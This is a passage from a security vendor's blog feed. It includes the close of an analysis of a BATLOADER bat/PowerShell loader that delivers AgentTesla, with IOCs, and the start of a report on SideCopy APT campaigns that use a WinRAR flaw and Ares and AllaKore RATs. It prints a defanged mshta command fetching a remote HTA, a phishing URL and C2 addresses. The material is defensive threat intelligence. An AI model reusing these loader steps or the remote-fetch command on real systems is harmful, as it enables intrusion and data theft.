src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig3-Obfuscated-Bat-File-1.png\" alt=\"\" width=\"1002\" height=\"438\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig3-Obfuscated-Bat-File-1.png 1002w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig3-Obfuscated-Bat-File-1-300x131.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig3-Obfuscated-Bat-File-1-768x336.png 768w\" sizes=\"(max-width: 1002px) 100vw, 1002px\" /></p>\n<p style=\"text-align: center;\">Fig 3: Obfuscated Bat File</p>\n<p>Deobfuscating the file gives the below result:</p>\n<p><img class=\"alignnone size-full wp-image-5904\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig4-Deobfuscated-Bat-Script.png\" alt=\"\" width=\"998\" height=\"485\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig4-Deobfuscated-Bat-Script.png 998w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig4-Deobfuscated-Bat-Script-300x146.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig4-Deobfuscated-Bat-Script-768x373.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig4-Deobfuscated-Bat-Script-330x160.png 330w\" sizes=\"(max-width: 998px) 100vw, 998px\" /></p>\n<p style=\"text-align: center;\">Fig 4: Deobfuscated Bat Script</p>\n<p>The above batch script is copying the powershell.exe executable to a location specified by %temp%\\Lroxmuu.png along with copying the current batch file to a location specified by %temp%\\Lroxmuu.png.bat.</p>\n<p>This command instructs PowerShell to execute a script or command with a custom parameter -win, and it expects a Base64-encoded string as an argument.</p>\n<p>Let&#8217;s decode the base64 encoded string.</p>\n<p><img class=\"alignnone size-full wp-image-5905\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig5-Base64-Decoded-string.png\" alt=\"\" width=\"989\" height=\"292\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig5-Base64-Decoded-string.png 989w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig5-Base64-Decoded-string-300x89.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig5-Base64-Decoded-string-768x227.png 768w\" sizes=\"(max-width: 989px) 100vw, 989px\" /></p>\n<p style=\"text-align: center;\">Fig 5: Base64 Decoded string</p>\n<p>We observe some more Powershell script here.</p>\n<p>This script appears to be performing dynamic code loading and execution from a Base64-encoded source from the batch script that is currently running. “-last 1” indicates making use of the last base64 encoded string present in the batch script.</p>\n<p>This script follows the below steps before loading itself into the memory:</p>\n<ol>\n<li>base64 decoded</li>\n<li>GZIP decompressed</li>\n<li>Reversing of the output</li>\n</ol>\n<p>Below is the base64 encoded string present at the end of the batch script:</p>\n<p><img class=\"alignnone size-full wp-image-5906\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig6-Base64-strings-at-the-end-of-the-Bat-script.png\" alt=\"\" width=\"993\" height=\"370\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig6-Base64-strings-at-the-end-of-the-Bat-script.png 993w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig6-Base64-strings-at-the-end-of-the-Bat-script-300x112.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig6-Base64-strings-at-the-end-of-the-Bat-script-768x286.png 768w\" sizes=\"(max-width: 993px) 100vw, 993px\" /></p>\n<p style=\"text-align: center;\">Fig 6: Base64 strings at the end of the Bat script</p>\n<p>We follow the same steps as mentioned in the Powershell script above to extract the payload.</p>\n<p><img class=\"alignnone size-full wp-image-5907\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig7-Base64-decode.png\" alt=\"\" width=\"1198\" height=\"517\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig7-Base64-decode.png 1198w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig7-Base64-decode-300x129.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig7-Base64-decode-768x331.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig7-Base64-decode-1024x442.png 1024w\" sizes=\"(max-width: 1198px) 100vw, 1198px\" /></p>\n<p style=\"text-align: center;\">Fig 7: Base64 decode</p>\n<p>We verify the filetype of the above base64 decoded output, which is gzip compressed.</p>\n<p><img class=\"alignnone size-full wp-image-5908\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig8-Filetype-verification.png\" alt=\"\" width=\"1172\" height=\"57\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig8-Filetype-verification.png 1172w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig8-Filetype-verification-300x15.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig8-Filetype-verification-768x37.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig8-Filetype-verification-1024x50.png 1024w\" sizes=\"(max-width: 1172px) 100vw, 1172px\" /></p>\n<p style=\"text-align: center;\">Fig 8: Filetype verification</p>\n<p>We decompress the above output.</p>\n<p><img class=\"alignnone size-full wp-image-5909\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig9-GZIP-Decompress.png\" alt=\"\" width=\"827\" height=\"39\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig9-GZIP-Decompress.png 827w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig9-GZIP-Decompress-300x14.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig9-GZIP-Decompress-768x36.png 768w\" sizes=\"(max-width: 827px) 100vw, 827px\" /></p>\n<p style=\"text-align: center;\">Fig 9: GZIP Decompress</p>\n<p>According to the Powershell script above, this needs to be reversed. Also, since the output needs to be reversed, we try to identify the filetype by checking the end of the file.</p>\n<p><img class=\"alignnone size-full wp-image-5910\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig10-Hex-of-the-reversed-PE-sample.png\" alt=\"\" width=\"499\" height=\"491\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig10-Hex-of-the-reversed-PE-sample.png 499w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig10-Hex-of-the-reversed-PE-sample-300x295.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig10-Hex-of-the-reversed-PE-sample-55x55.png 55w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig10-Hex-of-the-reversed-PE-sample-45x45.png 45w\" sizes=\"(max-width: 499px) 100vw, 499px\" /></p>\n<p style=\"text-align: center;\">Fig 10: Hex of the reversed PE sample</p>\n<p>This seems to be a PE file. Let&#8217;s reverse the file.</p>\n<p><img class=\"alignnone size-full wp-image-5911\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig11-The-dot-net-executable.png\" alt=\"\" width=\"935\" height=\"58\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig11-The-dot-net-executable.png 935w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig11-The-dot-net-executable-300x19.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig11-The-dot-net-executable-768x48.png 768w\" sizes=\"(max-width: 935px) 100vw, 935px\" /></p>\n<p style=\"text-align: center;\">Fig 11: The dot net executable</p>\n<p>And so, we came across a .NET executable file. This file is injected into a process, and depending on the specific malware family, it moves forward to infect the device. In many cases, this executable establishes a connection with the Command and Control (CnC) server to retrieve another payload. This final payload is what ultimately infects the machine. Nevertheless, we&#8217;ve also observed instances where this executable directly infects the machine without needing to download an additional payload.</p>\n<p>In this particular case, the malware is a variant of AgentTesla, which falls under the category of InfoStealer.</p>\n<p><strong>Conclusion:</strong></p>\n<p>In recent cases, we&#8217;ve seen this batloader employed for injecting AgentTesla. However, it&#8217;s not limited to just this malware strain. This batloader has been frequently observed facilitating the injection of other malware families as well. While there may be slight variations in the code, the underlying method remains remarkably consistent. This underscores the adaptability and widespread usage of this particular batloader in malicious activities. The key similarities are:</p>\n<ul>\n<li>Bat file copying Powershell from system32 to a new name as .bat/png.exe</li>\n<li>Removing the exe from the end to make use of the same bat script</li>\n<li>An obfuscated PowerShell script is extracted and  run from the bat script</li>\n<li>The PowerShell script finds some obfuscated payload from the bat</li>\n<li>Base64 Decodes the payload</li>\n<li>Decompresses the file</li>\n<li>Reverse the final payload</li>\n<li>A dot net file is observed</li>\n</ul>\n<p>While there may be some variation, these steps are typically followed. Initially, this batloader was utilized through OneNote attachments to propagate malware such as QuasarRAT and AsyncRAT. However, we&#8217;ve also noted instances where the batloader was employed to distribute Mallox Ransomware, AgentTesla, and a Cryptojacker. Essentially, it serves as a tool for orchestrating multi-staged attacks, ensuring the final payload is delivered to execute its malicious intent.</p>\n<p><strong>How Does SEQRITE Protect Its Customers?</strong></p>\n<p>BatLoader.Trojan.48264.GC</p>\n<p>Bat.AgentTesla.48158.GC</p>\n<p>Bat.Mallox.48121.GC</p>\n<p><strong>IOCs:</strong></p>\n<p>764250ddf94b90441193fe1c29754f231e0868d1878fdf3150e5744dd8d8c378</p>\n<p>d71cdb791f3f58bd064fb840488f7e708d707b1d39e70fbe5c597f7fbcc0699e</p>\n<p>fa78bb7d250a3893f188e5e7651070a20dd690fc6647020d5d399874e71c8e88</p>\n<p>184eaf1cfa3460a8fe544c6d3d253c18ac50ba18acb718d6a2707e25400a5eab<br />\n108e07174511fa58ece920149d6b2f26f386b33f5e54bfbbb758b9c3b6cae362<br />\n24f3f9ada9ef84eb3bb749de500e43c85640d8c0140ebe6d7573520f61bfe5f7<br />\n7af0a77161be52ad53fdb2ae9a06cbd9eaf8d59be43c642901efcbb5c03d30e3</p>\n<p>5158b0a023299c1922423a065b9825fd1769f1a87ffd2031375a0e893d523318</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/casting-light-on-batloader-an-insight-into-its-role-in-malware-delivery/\" data-wpel-link=\"internal\" target=\"_self\">Casting Light on BATLOADER: An Insight into its Role in Malware Delivery</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"wfw:commentRss":"https://www.seqrite.com/blog/casting-light-on-batloader-an-insight-into-its-role-in-malware-delivery/feed/","slash:comments":"0","commentcount":"0"},{"title":"SideCopy’s Multi-platform Onslaught: Leveraging WinRAR Zero-Day and Linux Variant of Ares RAT","link":"https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/","comments":"https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/#respond","pubDate":"Mon, 06 Nov 2023 09:55:58 +0000","dc:creator":{"#cdata-section":"Sathwik Ram Prakki"},"author":"Sathwik Ram Prakki","category":[{"#cdata-section":"APT"},{"#cdata-section":"Government"},{"#cdata-section":"Malware"},{"#cdata-section":"Phishing"},{"#cdata-section":"Vulnerability"},{"#cdata-section":"#AllaKoreRAT"},{"#cdata-section":"#APT36"},{"#cdata-section":"#AresRAT"},{"#cdata-section":"#CVE-2023-38831"},{"#cdata-section":"#DRat"},{"#cdata-section":"#KeyRAT"},{"#cdata-section":"#SideCopy"},{"#cdata-section":"#WinRAR"},{"#cdata-section":"apt"},{"#cdata-section":"India"}],"guid":{"@isPermaLink":"false","#text":"https://www.seqrite.com/blog/?p=5866"},"img":"https://www.seqrite.com/blog/wp-content/uploads/2023/11/SEQRITE-Blog-SideCopy-230x168.png","description":{"#cdata-section":"<p>SEQRITE Labs APT-Team has discovered multiple campaigns of APT SideCopy, targeting Indian government and defense entities in the past few months. The threat group is now exploiting the recent WinRAR vulnerability CVE-2023-38831 (See our advisory for more details) to deploy AllaKore RAT, DRat and additional payloads. The compromised domains, used to host payloads by SideCopy, [&#8230;]</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/\" data-wpel-link=\"internal\" target=\"_self\">SideCopy’s Multi-platform Onslaught: Leveraging WinRAR Zero-Day and Linux Variant of Ares RAT</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"content:encoded":{"#cdata-section":"<span class=\"rt-reading-time\" style=\"display: block;\"><span class=\"rt-label\">Estimated reading time: </span><span class=\"rt-time\">13</span><span class=\"rt-label\"> minutes</span></span><p>SEQRITE Labs APT-Team has discovered multiple campaigns of APT SideCopy, targeting Indian government and defense entities in the past few months. The threat group is now exploiting the recent WinRAR vulnerability <b><i>CVE-2023-38831</i></b> (See our <a href=\"https://www.seqrite.com/blog/threat-advisory-zero-day-vulnerabilities-detected-on-winrar/\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">advisory</a> for more details) to deploy AllaKore RAT, DRat and additional payloads. The compromised domains, used to host payloads by SideCopy, are reused multiple times, resolving to the same IP address. It has also deployed a Linux variant of open-source agent called Ares RAT, where code similarity with its parent threat group Transparent Tribe (APT36) has been found in the stager payload. Conducting multi-platform attacks simultaneously with the same decoys and naming convention, both SideCopy and APT36 share infrastructure and code to aggressively target India.</p>\n<p>In this blog, we’ll delve into the technicalities of two such campaigns we encountered during our telemetry analysis. We have observed more similar ongoing campaigns unfold and expect them to continue as the Israel-Hamas conflict intensifies, where not only Pakistan-aligned hacktivists but also other groups against Israel are targeting Indian websites with DDoS, defacement, and data breach attacks.</p>\n<h2><b>Threat Actor Profile</b></h2>\n<p>SideCopy is a Pakistan-linked Advanced Persistent Threat group that has been targeting South Asian countries, primarily the Indian Defense and Afghanistan government entities, since at least 2019. Almost every month, a new attack campaign has been observed this year in our telemetry, with changes over time where additional stages with <a href=\"https://www.seqrite.com/blog/double-action-triple-infection-and-a-new-rat-sidecopys-persistent-targeting-of-indian-defence\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">Double Action RAT</a>, new .NET-based RAT, and TTPs where PowerShell remote execution has been <a href=\"https://www.seqrite.com/resources/double-action-triple-infection-and-a-new-rat-sidecopys-persistent-targeting-of-indian-defence\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">uncovered</a> by our team. Its arsenal includes Action RAT, AllaKore RAT, Reverse RAT, Margulas RAT and more.</p>\n<p>This group is associated as a sub-division of Transparent Tribe (APT36), which has been persistently targeting the <a href=\"https://www.seqrite.com/blog/transparent-tribe-apt-actively-lures-indian-army-amidst-increased-targeting-of-educational-institutions\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">Indian Military</a> and is continuing to target <a href=\"https://www.seqrite.com/resources/transparent-tribe-apt-actively-lures-indian-army-amidst-increased-targeting-of-educational-institutions\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">university students</a> aggressively this year to share student data, possibly with terrorist groups for recruitment. It has updated its Linux malware arsenal this year with Poseidon and other utilities. Active since 2013, it has continuously used payloads such as Crimson RAT, Capra RAT, and Oblique RAT in its campaigns.</p>\n<p>Pakistani agents have used honey traps to lure defense personnel, creating an immense impact and damage by stealing confidential intel in this form of cyber espionage.</p>\n<h2><b>Analysis of Campaign-1</b></h2>\n<p>The first campaign of SideCopy observed is spread via a phishing link that downloads an archive file named “<i>Homosexuality &#8211; Indian Armed Forces.</i>” The decoy document is related to NSRO and is called “<i>ACR.pdf</i>” or “<i>ACR_ICR_ECR_Form_for_Endorsement_New_Policy.pdf.</i>”</p>\n<p><img class=\" wp-image-5883 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/c900af2540-212x300.png\" alt=\"\" width=\"416\" height=\"589\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/c900af2540-212x300.png 212w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/c900af2540-768x1086.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/c900af2540-724x1024.png 724w\" sizes=\"(max-width: 416px) 100vw, 416px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 1 – Decoy PDF</i></p>\n<p>Interestingly, we found the same decoy PDF is utilized by the Linux variant of Ares RAT<i>, </i>which was first seen in the last week of August on Virus Total. Both the compromised domains used resolved to the same IP address, as shown in the below figure. The domains used in April ‘<i>ssynergy[.]in</i>’ and May ‘<i>elfinindia[.]com</i>’ campaigns also point to the same IP. Moreover, the archive files hosted on different domains have the same name, indicating the reuse of compromised domains.</p>\n<p><img class=\" wp-image-5876 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/SideCopy_Oct2023-Ares-2.drawio-284x300.png\" alt=\"\" width=\"533\" height=\"564\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/SideCopy_Oct2023-Ares-2.drawio-284x300.png 284w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/SideCopy_Oct2023-Ares-2.drawio-970x1024.png 970w\" sizes=\"(max-width: 533px) 100vw, 533px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 2 – Infection chain-1 with the same IP</i></p>\n<p>The phishing URL targeting the Windows platform points to <b><i>sunfireglobal[.]in</i></b>, a compromised domain that is not alive at the time of writing, is resolving to the IP: <b><i>162.241.85[.]104</i></b>. URL is:</p>\n<table style=\"font-weight: 400;\">\n<tbody>\n<tr>\n<td></td>\n<td>hxxps://sunfireglobal[.]in/public/core/homo/Homosexuality%20-%20Indian%20Armed%20Forces.zip</td>\n</tr>\n</tbody>\n</table>\n<p>This contains a malicious shortcut file in a double extension format named “Homosexuality &#8211; Indian Armed Forces ․pdf.lnk” that triggers a remote HTA file as:</p>\n<table style=\"font-weight: 400;\">\n<tbody>\n<tr>\n<td></td>\n<td>C:\\Windows\\System32\\mshta.exe &#8220;hxxps://sunfireglobal[.]in/public/assests/files/db/acr/&#8221; &amp;&amp; tar.exe</td>\n</tr>\n</tbody>\n</table>\n<p>It contains two embedded files that are base64 encoded; one is the decoy PDF, and the other is a DLL. Only minor changes were observed in the HTA, and functionality remains the same – to check the .NET version, fetch the AV installed, decode, and run the DLL in-memory.</p>\n<p>After the decoy file is opened by the DLL (<i>preBotHta</i>), it beacons to the same domain and downloads an HTA and the final DLL contents to their target paths. The downloaded HTA is saved as “<b><i>seqrite.jpg</i></b>” in the TEMP folder, later moved to the target folder, and executed. Depending on the AV present – SEQRITE, Quick Heal, Kaspersky, Avast, Avira, Bitdefender, and Windows Defender; it executes the final DLL payload.</p>\n<p><img class=\" wp-image-5871 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-170413-231x300.png\" alt=\"\" width=\"420\" height=\"545\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-170413-231x300.png 231w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-170413.png 581w\" sizes=\"(max-width: 420px) 100vw, 420px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 3 – DLL preBotHta run in-memory</i></p>\n<p>Legitimate Windows apps like Credential wizard (<i>credwiz.exe</i>) or EFS REKEY wizard (<i>rekeywiz.exe) are</i> copied beside the target to sideload the DLL. Persistence is maintained via Startup (or) Run registry key to load the final RAT payload on system reboot. (Detailed analysis of Action RAT and all other payloads can be found in our previous <a href=\"https://www.seqrite.com/resources/double-action-triple-infection-and-a-new-rat-sidecopys-persistent-targeting-of-indian-defence\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">whitepaper</a>)</p>\n<p>Another archive file with the same name, “Homosexuality &#8211; Indian Armed Forces.zip,” is seen that contains an ELF file. It is spread using a domain named “<b><i>occoman[.]com,</i></b>” resolving to the same IP address for the <i>sunfireglobal[.].in,</i> showing the sharing of IP between compromised domains.</p>\n<p><img class=\" wp-image-5872 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-172327-Copy-2-Copy-300x142.png\" alt=\"\" width=\"496\" height=\"235\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-172327-Copy-2-Copy-300x142.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-172327-Copy-2-Copy.png 590w\" sizes=\"(max-width: 496px) 100vw, 496px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 4 – Content of both the archives</i></p>\n<p>Different file names for this Golang-based Linux malware that is masqueraded as a PDF were found as:</p>\n<table>\n<tbody>\n<tr>\n<td>Homosexuality &#8211; Indian Armed Forces ․pdf</td>\n<td>2023-10-24</td>\n</tr>\n<tr>\n<td>Unit Training Program ․pdf</td>\n<td>2023-09-20</td>\n</tr>\n<tr>\n<td>Social Media Usage ․pptx</td>\n<td>2023-08-30</td>\n</tr>\n</tbody>\n</table>\n<p>Utilizing the <i>GoReSym</i> plugin with IDA, we can extract function metadata as the binary is stripped (See our in-depth analysis of Go-based <a href=\"https://www.seqrite.com/resources/new-warp-malware-drops-modified-stealerium-infostealer\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">Warp</a> malware for plugin details).</p>\n<p>The process flow is similar to the first stage seen in the case of the Poseidon agent (observed by <a href=\"https://www.uptycs.com/blog/cyber-espionage-in-india-decoding-apt-36-new-linux-malware\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">Uptycs</a> and <a href=\"https://www.zscaler.com/blogs/security-research/peek-apt36-s-updated-arsenal\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">Zscaler</a>) having the exact target location, though this stage is not compiled using PyInstaller:</p>\n<ol>\n<li>Create a crontab to maintain persistence through system reboot under the current username.</li>\n<li>Download the decoy to the target directory “/.local/share” and open it.</li>\n<li>Download the Ares agent as “/.local/share/updates” and execute it.</li>\n</ol>\n<p><img class=\" wp-image-5870 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/linux_stage1-Copy-2-300x162.png\" alt=\"\" width=\"665\" height=\"359\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/linux_stage1-Copy-2-300x162.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/linux_stage1-Copy-2-768x415.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/linux_stage1-Copy-2-1024x553.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/linux_stage1-Copy-2.png 1105w\" sizes=\"(max-width: 665px) 100vw, 665px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 5 – Process flow of Stage-1</i></p>\n<p>After extracting the contents of the final PyInstaller payload, two Python-compiled files of our interest (<i>agent.pyc</i> and <i>config.pyc</i>) are retrieved. Decompiling and examining them leads to an open-source Python RAT called <a href=\"https://github.com/sweetsoftware/Ares\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">Ares</a>.  The URL format used to ping the server is: “<i>hxxps://(host)/api/(uid)/hello.</i>” and it includes the platform, hostname and username of the victim machine along with it. It supports the following 13 commands for C2 communication.</p>\n<table>\n<tbody>\n<tr>\n<td><b>Command</b></td>\n<td><b>Description</b></td>\n</tr>\n<tr>\n<td>upload</td>\n<td>Uploads a local file to the server</td>\n</tr>\n<tr>\n<td>download</td>\n<td>Downloads a file via HTTP(s)</td>\n</tr>\n<tr>\n<td>zip</td>\n<td>Creates a zip archive of a file or folder</td>\n</tr>\n<tr>\n<td>cd</td>\n<td>Change the current directory</td>\n</tr>\n<tr>\n<td>screenshot</td>\n<td>Takes a screenshot and uploads it to the server</td>\n</tr>\n<tr>\n<td>python</td>\n<td>Runs a Python command or a Python file</td>\n</tr>\n<tr>\n<td>persist</td>\n<td>Installs the agent via AutoStart directory</td>\n</tr>\n<tr>\n<td>clean</td>\n<td>Uninstalls the agent</td>\n</tr>\n<tr>\n<td>exit</td>\n<td>Kills the agent</td>\n</tr>\n<tr>\n<td>crack</td>\n<td>Removes persistence and kills the agent</td>\n</tr>\n<tr>\n<td>listall</td>\n<td>List file directory and upload it to the server</td>\n</tr>\n<tr>\n<td>help</td>\n<td>Display the help</td>\n</tr>\n<tr>\n<td>&lt;command&gt;</td>\n<td>Executes a shell command and returns its output</td>\n</tr>\n</tbody>\n</table>\n<p>No major changes were observed in the agent apart from changing the name from <i>ares</i> to <i>gedit</i>, and the server used by the agent is present in the config file: <b><i>161.97.151[.]200:7015.</i></b> Both the agent and config scripts include the name ‘<i>lee</i>’ pointing to the same agent as referred by <a href=\"https://blog.lumen.com/windows-subsystem-for-linux-wsl-threats/\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">Lumen</a>.</p>\n<p><img class=\" wp-image-5869 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/config-Copy-300x84.png\" alt=\"\" width=\"461\" height=\"129\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/config-Copy-300x84.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/config-Copy.png 764w\" sizes=\"(max-width: 461px) 100vw, 461px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 6 – Config file</i></p>\n<p><img class=\" wp-image-5879 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/agent_lee-300x151.png\" alt=\"\" width=\"646\" height=\"325\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/agent_lee-300x151.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/agent_lee-768x386.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/agent_lee-1024x515.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/agent_lee.png 1143w\" sizes=\"(max-width: 646px) 100vw, 646px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 7 – Agent script</i></p>\n<p>This payload is also named “<i>bossupdate,</i>” a similar naming convention seen with Poseidon and other utilities of Transparent Tribe that starts with the ‘boss’ prefix. APT36 is aiming for the operating system BOSS, developed in India for government entities, and is constantly expanding its Linux arsenal. Back in 2021, SideCopy was linked to the same RAT by QiAnXin’s <a href=\"https://ti.qianxin.com/blog/articles/Sidecopy-dual-platform-weapon/\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">Red Raindrop Team</a> and a forked version called <i>BackNet</i> by <a href=\"https://www.telsy.com/sidecopy-apt-from-windows-to-nix/\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">Telsy</a> later.</p>\n<h2><b>Analysis of Campaign-2</b></h2>\n<p>The second campaign has the same scenario where IP sharing is seen not only with the compromised domains but also with the C2 infrastructure. Exploitation of the recent WinRAR vulnerability CVE-2023-38831 is done via phishing, which downloads malicious archive files. Upon opening the archive files, a pdf file and a folder with the same name are present.</p>\n<p><img class=\" wp-image-5873 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-175304-300x153.png\" alt=\"\" width=\"480\" height=\"245\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-175304-300x153.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-175304.png 526w\" sizes=\"(max-width: 480px) 100vw, 480px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 8 – Archives used for WinRAR exploitation</i></p>\n<p>Opening the PDF will trigger the vulnerability, quietly launching the payload inside the folder by <i>ShellExecute</i> function of the WinRAR application.  The decoy PDF is related to an organization called the ‘<i>All India Association of Non-Gazetted Officers</i>’ (AIANGOs), which mentions a peaceful protest program to the Indian Ministry of Defense. Headquartered in Mumbai, AIANGOs was recognized by GOI, MoD in 2000 under CCS(RSA) Rule 1993 and affiliated to CDRA, as mentioned on their X (Twitter) page.</p>\n<p><img class=\" wp-image-5874 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-184745-300x198.png\" alt=\"\" width=\"683\" height=\"451\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-184745-300x198.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-184745-768x506.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-184745-1024x674.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-184745.png 1511w\" sizes=\"(max-width: 683px) 100vw, 683px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 9 – Decoy used in WinRAR exploitation</i></p>\n<p>The payload present in the folder is the AllaKore RAT agent, which has the functionality to steal system information, keylogging, take screenshots, upload &amp; download files, and take the remote access of the victim machine to send commands and upload stolen data to the C2.  Additionally, more connections have been made with the C2 utilized and its previous campaign, as described below:</p>\n<p><img class=\" wp-image-5878 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/SideCopy_Oct2023-WinRAR-2.drawio-300x280.png\" alt=\"\" width=\"612\" height=\"571\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/SideCopy_Oct2023-WinRAR-2.drawio-300x280.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/SideCopy_Oct2023-WinRAR-2.drawio-768x718.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/SideCopy_Oct2023-WinRAR-2.drawio-1024x957.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/SideCopy_Oct2023-WinRAR-2.drawio.png 1196w\" sizes=\"(max-width: 612px) 100vw, 612px\" 